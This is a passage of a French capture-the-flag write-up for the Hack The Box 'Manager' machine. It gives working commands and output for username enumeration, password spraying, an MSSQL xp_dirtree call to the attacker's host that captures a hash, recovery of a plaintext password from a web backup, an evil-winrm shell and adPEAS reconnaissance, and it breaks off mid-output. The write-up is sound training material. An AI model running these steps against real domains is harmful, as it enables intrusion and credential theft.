[WORKGROUP\\pak]:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share\n        SYSVOL          Disk      Logon server share\nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 10.10.11.236 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n</code></pre></p> <p>Bon, \u00e0 premi\u00e8re vue il ne reste pas \u00e9norm\u00e9ment de solutions. Je tente une \u00e9num\u00e9ration d'utilisateur via kerbrute:</p> <pre><code>pak@DESKTOP-AF1CU53:~/Downloads$ ./kerbrute_linux_amd64 userenum -d manager.htb --dc dc01.manager.htb /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt\n\n    __             __               __\n   / /_____  _____/ /_  _______  __/ /____\n  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\n / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/\n/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/\n\nVersion: v1.0.3 (9dad6e1) - 02/22/24 - Ronnie Flathers @ropnop\n\n2024/02/22 02:03:43 &gt;  Using KDC(s):\n2024/02/22 02:03:43 &gt;   dc01.manager.htb:88\n\n2024/02/22 02:03:43 &gt;  [+] VALID USERNAME:       ryan@manager.htb\n2024/02/22 02:03:45 &gt;  [+] VALID USERNAME:       guest@manager.htb\n2024/02/22 02:03:45 &gt;  [+] VALID USERNAME:       cheng@manager.htb\n2024/02/22 02:03:46 &gt;  [+] VALID USERNAME:       raven@manager.htb\n2024/02/22 02:03:48 &gt;  [+] VALID USERNAME:       administrator@manager.htb\n2024/02/22 02:03:54 &gt;  [+] VALID USERNAME:       Ryan@manager.htb\n2024/02/22 02:03:55 &gt;  [+] VALID USERNAME:       Raven@manager.htb\n2024/02/22 02:03:58 &gt;  [+] VALID USERNAME:       operator@manager.htb\n2024/02/22 02:04:27 &gt;  [+] VALID USERNAME:       Guest@manager.htb\n2024/02/22 02:04:28 &gt;  [+] VALID USERNAME:       Administrator@manager.htb\n2024/02/22 02:04:48 &gt;  [+] VALID USERNAME:       Cheng@manager.htb\n2024/02/22 02:05:46 &gt;  [+] VALID USERNAME:       jinwoo@manager.htb\n2024/02/22 02:05:57 &gt;  [+] VALID USERNAME:       RYAN@manager.htb\n2024/02/22 02:06:33 &gt;  [+] VALID USERNAME:       RAVEN@manager.htb\n2024/02/22 02:06:35 &gt;  [+] VALID USERNAME:       GUEST@manager.htb\n2024/02/22 02:07:31 &gt;  [+] VALID USERNAME:       Operator@manager.htb\n2024/02/22 02:13:45 &gt;  [+] VALID USERNAME:       OPERATOR@manager.htb\n</code></pre> <p>On voit quelques utilisateurs : ryan, cheng, raven, operator, jinwoo. Je mets ces noms d'utilisateur dans un fichier \"userlist\" pour me faciliter la vie plus tard.</p> <p>On a quelques utilisateurs, on peut tenter de l'asreproasting :</p> <pre><code>pak@DESKTOP-AF1CU53:~/tmp$ impacket-GetNPUsers -usersfile userlist -dc-ip 10.10.11.236 manager.htb/\nImpacket v0.11.0 - Copyright 2023 Fortra\n\n[-] User ryan doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User cheng doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User raven doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User jinwoo doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User operator doesn't have UF_DONT_REQUIRE_PREAUTH set\n</code></pre> <p>Rhaaaa... je regarde si je n'ai rien oubli\u00e9 qui pourrait me sauter aux yeux, et pendant ce temps je lance un bruteforce sur ces utilisateurs pour tenter de trouver un mot de passe. C'est bourrin, j'aime pas trop, mais je ne vois rien d'autre d'\u00e9vident. </p> <p>Au bout d'un temps certains, un pass est trouv\u00e9 :).</p> <pre><code>pak@DESKTOP-AF1CU53:~/Downloads$ crackmapexec smb 10.10.11.236 -u ../tmp/userlist -p /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt\n##SNIP##\nSMB         10.10.11.236    445    DC01             [+] manager.htb\\operator:operator\n</code></pre> <p>operator:operator.... Aller, pourquoi pas.</p> <p>Je confirme ces creds:</p> <pre><code>pak@DESKTOP-AF1CU53:~/Downloads$ crackmapexec smb 10.10.11.236 -u operator -p operator\nSMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.236    445    DC01             [+] manager.htb\\operator:operator\n</code></pre> <p>Oookay, on a un utilisateur. On peut continuer :) !</p>"},{"location":"Writeup/HTB/Machines/Manager/#operator","title":"Operator","text":"<p>Avec un utilisateur, on peut \u00e9num\u00e9rer les autres. Je ne sais pas si \u00e7a me servira, mais en tout cas \u00e7a va dans ma liste !</p> <pre><code>pak@DESKTOP-AF1CU53:~/Downloads$ crackmapexec ldap 10.10.11.236 -u operator -p operator --users\nSMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)\nLDAP        10.10.11.236    389    DC01             [+] manager.htb\\operator:operator\nLDAP        10.10.11.236    389    DC01             [*] Total of records returned 13\nLDAP        10.10.11.236    389    DC01             Administrator                  Built-in account for administering the computer/domain\nLDAP        10.10.11.236    389    DC01             Guest                          Built-in account for guest access to the computer/domain\nLDAP        10.10.11.236    389    DC01             krbtgt                         Key Distribution Center Service Account\nLDAP        10.10.11.236    389    DC01             Zhong\nLDAP        10.10.11.236    389    DC01             Cheng\nLDAP        10.10.11.236    389    DC01             Ryan\nLDAP        10.10.11.236    389    DC01             Raven\nLDAP        10.10.11.236    389    DC01             JinWoo\nLDAP        10.10.11.236    389    DC01             ChinHae\nLDAP        10.10.11.236    389    DC01             Operator\n</code></pre> <p>On en profite pour tenter un kerberoasting qui ne donne rien :</p> <pre><code>pak@DESKTOP-AF1CU53:~/Downloads$ crackmapexec ldap 10.10.11.236 -u operator -p operator --kerberoasting kerberoasted.txt\nSMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)\nLDAP        10.10.11.236    389    DC01             [+] manager.htb\\operator:operator\nLDAP        10.10.11.236    389    DC01             No entries found!\n</code></pre> <p>Et voir si nous avons plus de droits sur les partages :</p> <pre><code>pak@DESKTOP-AF1CU53:~/Downloads$ crackmapexec smb 10.10.11.236 -u operator -p operator --shares\nSMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.236    445    DC01             [+] manager.htb\\operator:operator\nSMB         10.10.11.236    445    DC01             [+] Enumerated shares\nSMB         10.10.11.236    445    DC01             Share           Permissions     Remark\nSMB         10.10.11.236    445    DC01             -----           -----------     ------\nSMB         10.10.11.236    445    DC01             ADMIN$                          Remote Admin\nSMB         10.10.11.236    445    DC01             C$                              Default share\nSMB         10.10.11.236    445    DC01             IPC$            READ            Remote IPC\nSMB         10.10.11.236    445    DC01             NETLOGON        READ            Logon server share\nSMB         10.10.11.236    445    DC01             SYSVOL          READ            Logon server share\n</code></pre> <p>Rien de bien particulier. Je continue d'\u00e9num\u00e9rer rapidement, et vois que je peux me connecter \u00e0 la base de donn\u00e9es MsSQL. Je pense que la suite se trouvera par ici :)...</p> <pre><code>pak@DESKTOP-AF1CU53:~/Downloads$ crackmapexec mssql 10.10.11.236 -u operator -p operator -q 'SELECT name FROM master.dbo.sysdatabases;'\nMSSQL       10.10.11.236    1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:manager.htb)\nMSSQL       10.10.11.236    1433   DC01             [+] manager.htb\\operator:operator\nMSSQL       10.10.11.236    1433   DC01             name\nMSSQL       10.10.11.236    1433   DC01             ------\nMSSQL       10.10.11.236    1433   DC01             master\nMSSQL       10.10.11.236    1433   DC01             tempdb\nMSSQL       10.10.11.236    1433   DC01             model\nMSSQL       10.10.11.236    1433   DC01             msdb\n</code></pre> <p>Je me connecte en direct au serveur :</p> <pre><code>pak@DESKTOP-AF1CU53:~/Downloads$ impacket-mssqlclient -windows-auth manager.htb/operator:operator@10.10.11.236\n</code></pre> <p>Ce qui me vient directement comme id\u00e9e l\u00e0-dessus, c'est de lancer responder sur ma machine, utiliser xp_dirtree sur le serveur et voir si j'obtiens une r\u00e9ponse :</p> <pre><code>SQL (MANAGER\\Operator  guest@master)&gt; xp_dirtree \\\\10.10.16.10\\fauxpartage\nsubdirectory   depth   file\n------------   -----   ----\nSQL (MANAGER\\Operator  guest@master)&gt;\n</code></pre> <pre><code>DC01$::MANAGER:7e9d3c9bb6415dff:5DA46A928DF5BF19541063C4CB527C17:0101000000000000803FF5899365DA012BF2D85E7EC63FC30000000002000800430033004200420001001E00570049004E002D004300330049005500360050005900320044004600330004003400570049004E002D00430033004900550036005000590032004400460033002E0043003300420042002E004C004F00430041004C000300140043003300420042002E004C004F00430041004C000500140043003300420042002E004C004F00430041004C0007000800803FF5899365DA0106000400020000000800300030000000000000000000000000300000A2CE93D6583FE8B00E95F0C748AA0E517A8E902DA9BF533DD7235C76C21DE6FF0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00310030000000000000000000\n</code></pre> <p>Okay, on a un r\u00e9sultat, voyons voir si il est exploitable... Evidemment, non, ce serait beaucoup trop simple :). </p>"},{"location":"Writeup/HTB/Machines/Manager/#xp_dirtree","title":"xp_dirtree","text":"<p>Par contre, xp_dirtree fonctionne donc je peux potentiellement me balader dans les fichiers du serveur:</p> <pre><code>SQL (MANAGER\\Operator  guest@master)&gt; EXEC xp_dirtree 'C:\\', 1, 1;\nsubdirectory                depth   file\n-------------------------   -----   ----\n$Recycle.Bin                    1      0\n\nDocuments and Settings          1      0\n\ninetpub                         1      0\n\nPerfLogs                        1      0\n\nProgram Files                   1      0\n\nProgram Files (x86)             1      0\n\nProgramData                     1      0\n\nRecovery                        1      0\n\nSQL2019                         1      0\n\nSystem Volume Information       1      0\n\nUsers                           1      0\n\nWindows                         1      0\n</code></pre> <pre><code>SQL (MANAGER\\Operator  guest@master)&gt; EXEC xp_dirtree 'C:\\inetpub\\wwwroot', 1, 1;\nsubdirectory                      depth   file\n-------------------------------   -----   ----\nabout.html                            1      1\n\ncontact.html                          1      1\n\ncss                                   1      0\n\nimages                                1      0\n\nindex.html                            1      1\n\njs                                    1      0\n\nservice.html                          1      1\n\nweb.config                            1      1\n\nwebsite-backup-27-07-23-old.zip       1      1\n</code></pre> <p>Un fichier de backup \u00e0 la racine du serveur web, int\u00e9ressant, r\u00e9cup\u00e9rons le :) ! </p> <pre><code>pak@DESKTOP-AF1CU53:~/tmp$ wget http://manager.htb/website-backup-27-07-23-old.zip\n--2024-02-22 14:06:04--  http://manager.htb/website-backup-27-07-23-old.zip\nResolving manager.htb (manager.htb)... 10.10.11.236\nConnecting to manager.htb (manager.htb)|10.10.11.236|:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 1045328 (1021K) [application/x-zip-compressed]\nSaving to: \u2018website-backup-27-07-23-old.zip\u2019\n\nwebsite-backup-27-07-23-old.zip    100%[==============================================================&gt;]   1021K  3.78MB/s    in 0.3s\n\n2024-02-22 14:06:05 (3.78 MB/s) - \u2018website-backup-27-07-23-old.zip\u2019 saved [1045328/1045328]\n</code></pre> <pre><code>pak@DESKTOP-AF1CU53:~/tmp$ unzip website-backup-27-07-23-old.zip\nArchive:  website-backup-27-07-23-old.zip\n  inflating: .old-conf.xml\n  inflating: about.html\n  inflating: contact.html\n  inflating: css/bootstrap.css\n  inflating: css/responsive.css\n  inflating: css/style.css\n  inflating: css/style.css.map\n  inflating: css/style.scss\n  inflating: images/about-img.png\n  inflating: images/body_bg.jpg\n extracting: images/call.png\n extracting: images/call-o.png\n  inflating: images/client.jpg\n  inflating: images/contact-img.jpg\n extracting: images/envelope.png\n extracting: images/envelope-o.png\n  inflating: images/hero-bg.jpg\n extracting: images/location.png\n extracting: images/location-o.png\n extracting: images/logo.png\n  inflating: images/menu.png\n extracting: images/next.png\n extracting: images/next-white.png\n  inflating: images/offer-img.jpg\n  inflating: images/prev.png\n extracting: images/prev-white.png\n extracting: images/quote.png\n extracting: images/s-1.png\n extracting: images/s-2.png\n extracting: images/s-3.png\n extracting: images/s-4.png\n extracting: images/search-icon.png\n  inflating: index.html\n  inflating: js/bootstrap.js\n  inflating: js/jquery-3.4.1.min.js\n  inflating: service.html\n</code></pre> <p>Tout de suite un fichier me saute aux yeux : .old-conf.xml</p> <pre><code>pak@DESKTOP-AF1CU53:~/tmp$ cat .old-conf.xml\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;ldap-conf xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"&gt;\n   &lt;server&gt;\n      &lt;host&gt;dc01.manager.htb&lt;/host&gt;\n      &lt;open-port enabled=\"true\"&gt;389&lt;/open-port&gt;\n      &lt;secure-port enabled=\"false\"&gt;0&lt;/secure-port&gt;\n      &lt;search-base&gt;dc=manager,dc=htb&lt;/search-base&gt;\n      &lt;server-type&gt;microsoft&lt;/server-type&gt;\n      &lt;access-user&gt;\n         &lt;user&gt;raven@manager.htb&lt;/user&gt;\n         &lt;password&gt;R4v3nBe5tD3veloP3r!123&lt;/password&gt;\n      &lt;/access-user&gt;\n      &lt;uid-attribute&gt;cn&lt;/uid-attribute&gt;\n   &lt;/server&gt;\n   &lt;search type=\"full\"&gt;\n      &lt;dir-list&gt;\n         &lt;dir&gt;cn=Operator1,CN=users,dc=manager,dc=htb&lt;/dir&gt;\n      &lt;/dir-list&gt;\n   &lt;/search&gt;\n&lt;/ldap-conf&gt;\n</code></pre> <p>Bingo ! </p> <pre><code>pak@DESKTOP-AF1CU53:~/tmp$ crackmapexec smb 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'\nSMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.236    445    DC01             [+] manager.htb\\raven:R4v3nBe5tD3veloP3r!123\n</code></pre> <p>Et un acc\u00e8s \u00e0 WinRM en prime... :)</p> <pre><code>pak@DESKTOP-AF1CU53:~/tmp$ evil-winrm -i 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'\n\nEvil-WinRM shell v3.5\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n\nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Raven\\Documents&gt;\n</code></pre>"},{"location":"Writeup/HTB/Machines/Manager/#raven","title":"Raven","text":"<p>Bon, il serait temps de sortir l'AdPEAS :</p> <pre><code>*Evil-WinRM* PS C:\\Users\\Raven\\Documents&gt; upload /home/pak/Tools/Windows/AD/adPEAS.ps1\n\nInfo: Uploading /home/pak/Tools/Windows/AD/adPEAS.ps1 to C:\\Users\\Raven\\Documents\\adPEAS.ps1\n\nData: 4159704 bytes of 4159704 bytes copied\n\nInfo: Upload successful!\n*Evil-WinRM* PS C:\\Users\\Raven\\Documents&gt; Import-Module .\\adPEAS.ps1\n*Evil-WinRM* PS C:\\Users\\Raven\\Documents&gt; Invoke-adPEAS\n\n               _ _____  ______           _____\n              | |  __ \\|  ____|   /\\    / ____|\n      ____  __| | |__) | |__     /  \\  | (___\n     / _  |/ _  |  ___/|  __|   / /\\ \\  \\___ \\\n    | (_| | (_| | |    | |____ / ____ \\ ____) |\n     \\__,_|\\__,_|_|    |______/_/    \\_\\_____/\n                                            Version 0.8.13\n\n    Active Directory Enumeration\n    by @61106960\n\n    Legend\n        [?] Searching for juicy information\n        [!] Found a vulnerability which may can be exploited in some way\n        [+] Found some interesting information for further investigation\n        [*] Some kind of note\n        [#] Reserved\n\n\n[?] +++++ Searching for Juicy Active Directory Information +++++\n\n[?] +++++ Checking General Domain Information +++++\n[+] Found general Active Directory domain information for domain 'manager.htb':\nDomain Name:                            manager.htb\nDomain SID:                             S-1-5-21-4078382237-1492182817-2568127209\nDomain Functional Level:                Windows 2016\nForest Name:                            manager.htb\nForest Children:                        No Subdomain[s] available\nDomain Controller:                      dc01.manager.htb\n\n[?] +++++ Checking Domain Policies +++++\n[+] Found password policy of domain 'manager.htb':\nMinimum Password Age:                   1 days\nMaximum Password Age:                   42 days\n[+] Minimum Password Length:            7 character\n[!] Password Complexity:                Disabled\n[!] Lockout Account:                    Disabled\nReversible Encryption:                  Disabled\n[+] Found Kerberos policy of domain 'manager.htb':\nMaximum Age of TGT:                     10 hours\nMaximum Age of TGS:                     600 minutes\nMaximum Clock Time Difference:          5 minutes\nKrbtgt Password Last Set:               07/27/2023 03:19:45\n\n[?] +++++ Checking Domain Controller, Sites and Subnets +++++\n[+] Found domain controller of domain 'manager.htb':\nDC Host Name:                           dc01.manager.htb\nDC Roles:                               SchemaRole,NamingRole,PdcRole,RidRole,InfrastructureRole\nDC IP Address:                          ::1\nSite Name:                              Default-First-Site-Name\n\n\n[?] +++++ Checking Forest and Domain Trusts +++++\n\n[?] +++++ Checking Juicy Permissions +++++\n\n[?] +++++ Checking Add-Computer Permissions +++++\n[+] Filtering found identities that can add a computer object to domain '':\n[!] Every member of group 'Authenticated Users' can add a computer to domain ''\n\ndistinguishedName:                      CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=manager,DC=htb\nobjectSid:                              S-1-5-11\nmemberOf:                               CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=manager,DC=htb\n                                        CN=Certificate Service DCOM Access,CN=Builtin,DC=manager,DC=htb\n                                        CN=Users,CN=Builtin,DC=manager,DC=htb\n\n\n[?] +++++ Checking DCSync Permissions +++++\n[+] Filtering found identities that can perform DCSync in domain '':\n\n[?] +++++ Checking LAPS Permissions +++++\n\n[?] +++++ Searching for GPO local group membership Information +++++\n\n[?] +++++ Searching for Active Directory Certificate Services Information +++++\n[+] Found at least one available Active Directory Certificate Service\nadPEAS does basic enumeration only, consider reading https://posts.specterops.io/certified-pre-owned-d95910965cd2\n\n[+] Found Active Directory Certificate Services 'manager-DC01-CA':\nCA Name:                                manager-DC01-CA\nCA dnshostname:                         dc01.manager.htb\nCA IP Address:                          10.10.11.236\nDate of Creation:                       07/27/2023 10:31:05\nDistinguishedName:                      CN=manager-DC01-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=manager,DC=htb\nNTAuthCertificates:                     True\nAvailable Templates:                    SubCA\n                                        DirectoryEmailReplication\n                                        DomainControllerAuthentication\n                                        KerberosAuthentication\n                                        EFSRecovery\n                                        EFS\n                                        DomainController\n                                        WebServer\n                                        Machine\n                                        User\n                                        Administrator\n\n[?] +++++ Searching for Vulnerable Certificate Templates +++++\nadPEAS does basic enumeration only, consider using https://github.com/GhostPack/Certify or https://github.com/ly4k/Certipy\n\n[?] +++++ Checking Template 'SubCA' +++++\n[!] Template 'SubCA' has Flag 'ENROLLEE_SUPPLIES_SUBJECT'\nTemplate Name:                          SubCA\nTemplate distinguishedname:             CN=SubCA,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=manager,DC=htb\nDate of Creation:                       07/27/2023 10:31:05\nEnrollmentFlag:                         0\n[!] CertificateNameFlag:                ENROLLEE_SUPPLIES_SUBJECT\n\n[?] +++++ Checking Template 'DirectoryEmailReplication' +++++\n\n[?] +++++ Checking Template 'DomainControllerAuthentication' +++++\n\n[?] +++++ Checking Template 'KerberosAuthentication' +++++\n\n[?] +++++ Checking Template 'EFSRecovery' +++++\n\n[?] +++++ Checking Template 'EFS' +++++\n[+] Identity 'MANAGER\\Domain Users' has enrollment rights for template 'EFS'\nTemplate Name:                          EFS\nTemplate distinguishedname:             CN=EFS,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=manager,DC=htb\nDate of Creation:                       07/27/2023 10:31:05\nExtended Key Usage:                     Encrypting File System\nEnrollmentFlag:                         INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT\nCertificateNameFlag:                    SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH\n[+] Enrollment allowed for:             MANAGER\\Domain Users\n\n[?] +++++ Checking Template 'DomainController' +++++\n\n[?] +++++ Checking Template 'WebServer' +++++\n[!] Template 'WebServer' has Flag 'ENROLLEE_SUPPLIES_SUBJECT'\nTemplate Name:                          WebServer\nTemplate distinguishedname:             CN=WebServer,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=manager,DC=htb\nDate of Creation:                       07/27/2023 10:31:05\nExtended Key Usage:                     Server Authentication\nEnrollmentFlag:                         0\n[!] CertificateNameFlag:                ENROLLEE_SUPPLIES_SUBJECT\n\n[?] +++++ Checking Template 'Machine' +++++\n[+] Identity 'MANAGER\\Domain Computers' has enrollment rights for template 'Machine'\nTemplate Name:                          Machine\nTemplate distinguishedname:             CN=Machine,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=manager,DC=htb\nDate of Creation:                       07/27/2023 10:31:05\n[+] Extended Key Usage:                 Client Authentication, Server Authentication\nEnrollmentFlag:                         AUTO_ENROLLMENT\nCertificateNameFlag:                    SUBJECT_ALT_REQUIRE_DNS, SUBJECT_REQUIRE_DNS_AS_CN\n[+] Enrollment allowed for:             MANAGER\\Domain Computers\n\n[?] +++++ Checking Template 'User' +++++\n[+] Identity 'MANAGER\\Domain Users' has enrollment rights for template 'User'\nTemplate Name:                          User\nTemplate distinguishedname:             CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=manager,DC=htb\nDate of Creation:                       07/27/2023 10:31:05\n[+] Extended Key Usage:                 Encrypting File System, Secure E-mail, Client Authentication\nEnrollmentFlag:                         INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT\nCertificateNameFlag:                    SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH\n[+] Enrollment allowed for:             MANAGER\\Domain Users\n\n[?] +++++ Checking Template 'Administrator' +++++\n\n[?] +++++ Searching for Credentials Exposure +++++\n\n[?] +++++ Searching for ASREProastable User +++++\n\n[?] +++++ Searching for Kerberoastable User +++++\n\n[?] +++++ Searching for User with 'Linux/Unix Password' attribute +++++\n\n[?] +++++ Searching for Computer with enabled and readable LAPS attribute +++++\n\n[?] +++++ Searching for Group Managed Service Account (gMSA) +++++\n\n[?] +++++ Searching for Credentials in SYSVOL Group Policy Files +++++\n\n[?] +++++ Searching for Sensitive Information in NETLOGON Share +++++\n\n[?] +++++ Searching for Delegation Issues +++++\n\n[?] +++++ Searching for Computer with Unconstrained Delegation Rights +++++\n\n[?] +++++ Searching for Computer with Constrained Delegation Rights +++++\n\n[?] +++++ Searching for Computer with Resource-Based Constrained Delegation Rights +++++\n\n[?] +++++ Searching for User with Constrained Delegation Rights +++++\n\n[?] +++++ Searching for User with Resource-Based Constrained Delegation Rights +++++\n\n[?] +++++ Starting Account Enumeration +++++\n\n[?] +++++ Searching for Azure AD Connect +++++\n\n[?] +++++ Searching for Users in High Privileged Groups +++++\n[+] Found members in group 'BUILTIN\\Administrators':\nGroupName:                              Enterprise Admins\ndistinguishedName:                      CN=Enterprise Admins,CN=Users,DC=manager,DC=htb\nobjectSid:                              S-1-5-21-4078382237-1492182817-2568127209-519\n[+] description:                        Designated administrators of the enterprise\n\nGroupName:                              Domain Admins\ndistinguishedName:                      CN=Domain Admins,CN=Users,DC=manager,DC=htb\nobjectSid:                              S-1-5-21-4078382237-1492182817-2568127209-512\n[+] description:                        Designated administrators of the domain\n\nsAMAccountName:                         Administrator\ndistinguishedName:                      CN=Administrator,CN=Users,DC=manager,DC=htb\nobjectSid:                              S-1-5-21-4078382237-1492182817-2568127209-500\nmemberOf:                               CN=Group Policy Creator Owners,CN=Users,DC=manager,DC=htb\n                                        CN=Domain Admins,CN=Users,DC=manager,DC=htb\n                                        CN=Enterprise Admins,CN=Users,DC=manager,DC=htb\n                                        CN=Schema Admins,CN=Users,DC=manager,DC=htb\n                                        CN=Administrators,CN=Builtin,DC=manager,DC=htb\n[+] description:                        Built-in account for administering the computer/domain\n[*] accountexpires:                     This identity has been expired since 12/31/1600 16:00:00\npwdLastSet:                             07/27/2023 08:24:35\nlastLogonTimestamp:                     02/20/2024 11:40:08\nuserAccountControl:                     NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, NOT_DELEGATED\n[+] admincount:                         This identity is or was member of a high privileged admin group\n\n[+] Found members in group 'MANAGER\\Domain Admins':\nsAMAccountName:                         Administrator\ndistinguishedName:                      CN=Administrator,CN=Users,DC=manager,DC=htb\nobjectSid:                              S-1-5-21-4078382237-1492182817-2568127209-500\nmemberOf:                               CN=Group Policy Creator Owners,CN=Users,DC=manager,DC=htb\n                                        CN=Domain Admins,CN=Users,DC=manager,DC=htb\n                                        CN=Enterprise Admins,CN=Users,DC=manager,DC=htb\n                                        CN=Schema Admins,CN=Users,DC=manager,DC=htb\n                                        CN=Administrators,CN=Builtin,DC=manager,DC=htb\n[+] description:                        Built-in account for administering the computer/domain\n[*] accountexpires:                     This identity has been expired since 12/31/1600 16:00:00\npwdLastSet:                             07/27/2023 08:24:35\nlastLogonTimestamp:                     02/20/2024 11:40:08\nuserAccountControl:                     NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, NOT_DELEGATED\n[+] admincount:                         This identity is or was member of a high privileged admin group\n\n[+] Found members in group 'MANAGER\\Enterprise Admins':\nsAMAccountName:                         Administrator\ndistinguishedName:                      CN=Administrator,CN=Users,DC=manager,DC=htb\nobjectSid:                              S-1-5-21-4078382237-1492182817-2568127209-500\nmemberOf:                               CN=Group Policy Creator Owners,CN=Users,DC=manager,DC=htb\n                                        CN=Domain Admins,CN=Users,DC=manager,DC=htb\n                                        CN=Enterprise Admins,CN=Users,DC=manager,DC=htb\n                                        CN=Schema Admins,CN=Users,DC=manager,DC=htb\n                                        CN=Administrators,CN=Builtin,DC=manager,DC=htb\n[+] description:                        Built-in account for administering the computer/domain\n[*] accountexpires:                     This identity has been expired since 12/31/1600 16:00:00\npwdLastSet:                             07/27/2023 08:24:35\nlastLogonTimestamp:                     02/20/2024 11:40:08\nuserAccountControl:                     NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, NOT_DELEGATED\n[+] admincount:                         This identity is or was member of a high privileged admin group\n\n[+] Found members in group 'MANAGER\\Group Policy Creator Owners':\nsAMAccountName:                         Administrator\ndistinguishedName:                      CN=Administrator,CN=Users,DC=manager,DC=htb\nobjectSid:                              S-1-5-21-4078382237-1492182817-2568127209-500\nmemberOf:                               CN=Group Policy Creator Owners,CN=Users,DC=manager,DC=htb\n                                        CN=Domain Admins,CN=Users,DC=manager,DC=htb\n                                        CN=Enterprise Admins,CN=Users,DC=manager,DC=htb\n                                        CN=Schema Admins,CN=Users,DC=manager,DC=htb\n                                        CN=Administrators,CN=Builtin,DC=manager,DC=htb\n[+] description:                        Built-in account for administering the computer/domain\n[*] accountexpires:                     This identity has been expired since 12/31/1600 16:00:00\npwdLastSet:                             07/27/2023 08:24:35\nlastLogonTimestamp:                     02/20/2024 11:40:08\nuserAccountControl:                     NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, NOT_DELEGATED\n[+] admincount:                         This identity is or was member of a high privileged admin group\n\n[+] Found members in group 'BUILTIN\\Access Control Assistance Operators':\nsAMAccountName:                         Raven\ndistinguishedName:                      CN=Raven,CN=Users,DC=manager,DC=htb\nobjectSid:                              S-1-5-21-4078382237-1492182817-2568127209-1116\nmemberOf:                               CN=Remote Management Users,CN=Builtin,DC=manager,DC=htb\npwdLastSet:                             07/27/2023 08:23:10\nlastLogonTimestamp:                     02/22/2024 12:13:56\nuserAccountControl:                     NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD\n\n[+] Found members in group 'MANAGER\\Cert Publishers':\nsAMAccountName:                         DC01$\ndistinguishedName:                      CN=DC01,OU=Domain Controllers,DC=manager,DC=htb\nobjectSid:                              S-1-5-21-4078382237-1492182817-2568127209-1000\noperatingsystem:                        Windows Server 2019 Standard\nmemberOf:                               CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=manager,DC=htb\n                                        CN=Cert Publishers,CN=Users,DC=manager,DC=htb\npwdLastSet:                             10/16/2023 14:00:03\nlastLogonTimestamp:                     02/20/2024 11:39:17\n[+] userAccountControl:                 SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION\n\n\n[?] +++++ Searching for High Privileged Users with a password older 5 years +++++\n\n[?] +++++ Searching for High Privileged User which may not require a Password +++++\n\n[?] +++++ Starting Computer Enumeration +++++\n\n[?] +++++ Searching for Domain Controllers +++++\n[+] Found Domain Controller 'DC01$':\nsAMAccountName:                         DC01$\ndistinguishedName:                      CN=DC01,OU=Domain Controllers,DC=manager,DC=htb\nobjectSid:                              S-1-5-21-4078382237-1492182817-2568127209-1000\noperatingsystem:                        Windows Server 2019 Standard\nmemberOf:                               CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=manager,DC=htb\n                                        CN=Cert Publishers,CN=Users,DC=manager,DC=htb\npwdLastSet:                             10/16/2023 14:00:03\nlastLogonTimestamp:                     02/20/2024 